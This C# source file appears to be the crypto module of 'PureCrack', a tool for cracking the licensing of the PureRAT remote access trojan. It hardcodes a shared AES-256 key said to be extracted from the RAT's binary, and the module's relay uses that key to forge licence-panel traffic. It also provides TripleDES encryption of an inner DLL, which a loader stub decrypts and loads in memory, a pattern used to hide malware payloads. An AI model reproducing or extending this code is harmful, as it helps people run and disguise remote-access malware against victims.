using System;
using System.IO;
using System.Security.Cryptography;

namespace PureCrack.Crypto;

/// <summary>
/// Symmetric crypto helpers used by the relay (AES-256-CBC for licence-API
/// bodies) and the stub builder (TripleDES-CBC for the inner DLL resource).
///
/// We deliberately use the BCL primitives (<see cref="Aes"/> /
/// <see cref="TripleDES"/> from <c>System.Security.Cryptography</c>) rather
/// than hand-rolling. PureRAT itself uses these same APIs — symmetric choice.
/// And the antitamper audit we read flagged a padding-oracle vuln in their
/// hand-rolled AES-CBC-PKCS7 unpadder, which is exactly the class of bug we
/// avoid by sticking with the framework implementation.
/// </summary>
public static class Symmetric
{
    /// <summary>
    /// Static AES-256 key the panel uses for licence-API bodies. Recovered
    /// from PureRAT.exe's IL: see the static byte array initialiser referenced
    /// from the licence-HTTP-client class. This is the same key for every
    /// installation — we exploit that fact.
    /// </summary>
    public static readonly byte[] AesKey = HexToBytes(
        "e6c43cc05d35fee7c8533d96203eeda357c65e85e30dbe622fad26fdfbb222a8");

    // ============================================================================
    // AES-256-CBC + PKCS7 (panel licence-API wire bodies)
    // ============================================================================

    public static byte[] AesEncrypt(byte[] plaintext, byte[] iv)
    {
        if (iv.Length != 16) throw new ArgumentException("iv must be 16 bytes", nameof(iv));
        using var aes = Aes.Create() ?? throw new InvalidOperationException("Aes.Create returned null");
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.KeySize = 256;
        aes.Key = AesKey;
        aes.IV = iv;
        using var enc = aes.CreateEncryptor();
        return enc.TransformFinalBlock(plaintext, 0, plaintext.Length);
    }

    public static byte[] AesDecrypt(byte[] ciphertext, byte[] iv)
    {
        if (iv.Length != 16) throw new ArgumentException("iv must be 16 bytes", nameof(iv));
        using var aes = Aes.Create() ?? throw new InvalidOperationException("Aes.Create returned null");
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.KeySize = 256;
        aes.Key = AesKey;
        aes.IV = iv;
        using var dec = aes.CreateDecryptor();
        return dec.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
    }

    /// <summary>
    /// Format the panel speaks: <c>[16-byte IV][AES-256-CBC ciphertext]</c>.
    /// Convenience wrapper used by the relay for both directions.
    /// </summary>
    public static byte[] AesEncryptFraming(byte[] plaintext)
    {
        var iv = RandomBytes(16);
        var ct = AesEncrypt(plaintext, iv);
        var output = new byte[16 + ct.Length];
        Buffer.BlockCopy(iv, 0, output, 0, 16);
        Buffer.BlockCopy(ct, 0, output, 16, ct.Length);
        return output;
    }

    public static byte[] AesDecryptFraming(byte[] framedBody)
    {
        if (framedBody.Length < 32)
            throw new ArgumentException("framed body must be at least 32 bytes (IV + 1 block)");
        var iv = new byte[16];
        Buffer.BlockCopy(framedBody, 0, iv, 0, 16);
        var ct = new byte[framedBody.Length - 16];
        Buffer.BlockCopy(framedBody, 16, ct, 0, ct.Length);
        return AesDecrypt(ct, iv);
    }

    // ============================================================================
    // TripleDES-CBC + PKCS7 (Loader's encrypted inner-DLL resource)
    // ============================================================================

    /// <summary>
    /// Encrypt the gzipped inner DLL with a per-build random TripleDES key+IV.
    /// The Loader has both baked in as base64 constants and decrypts at startup
    /// before <c>Assembly.Load(byte[])</c>.
    /// </summary>
    public static byte[] TripleDesEncrypt(byte[] plaintext, byte[] key, byte[] iv)
    {
        if (key.Length != 24) throw new ArgumentException("3DES key must be 24 bytes", nameof(key));
        if (iv.Length  != 8)  throw new ArgumentException("3DES iv must be 8 bytes",  nameof(iv));
        using var tdes = TripleDES.Create() ?? throw new InvalidOperationException("TripleDES.Create returned null");
        tdes.Mode = CipherMode.CBC;
        tdes.Padding = PaddingMode.PKCS7;
        tdes.Key = key;
        tdes.IV = iv;
        using var enc = tdes.CreateEncryptor();
        return enc.TransformFinalBlock(plaintext, 0, plaintext.Length);
    }

    // ============================================================================
    // Helpers
    // ============================================================================

    public static byte[] RandomBytes(int n)
    {
        var output = new byte[n];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(output);
        return output;
    }

    public static byte[] Gzip(byte[] data)
    {
        using var ms = new MemoryStream();
        using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
        {
            gz.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }

    public static byte[] HexToBytes(string hex)
    {
        if ((hex.Length & 1) != 0)
            throw new ArgumentException("hex string must have even length", nameof(hex));
        var output = new byte[hex.Length / 2];
        for (var i = 0; i < output.Length; i++)
        {
            var hi = HexNibble(hex[i * 2]);
            var lo = HexNibble(hex[i * 2 + 1]);
            output[i] = (byte)((hi << 4) | lo);
        }
        return output;
    }

    private static int HexNibble(char c) => c switch
    {
        >= '0' and <= '9' => c - '0',
        >= 'a' and <= 'f' => c - 'a' + 10,
        >= 'A' and <= 'F' => c - 'A' + 10,
        _ => throw new FormatException($"non-hex char: {c}"),
    };

    /// <summary>
    /// Constant-time byte-array equality. Useful for any comparison of
    /// security-relevant bytes (cert hashes, MAC tags) where short-circuit
    /// equality could leak via timing. Not used for control flow today, but
    /// available so we don't reach for <c>SequenceEqual</c> when it matters.
    /// </summary>
    public static bool ConstantTimeEquals(byte[] a, byte[] b)
    {
        if (a.Length != b.Length) return false;
        var diff = 0;
        for (var i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
        return diff == 0;
    }
}
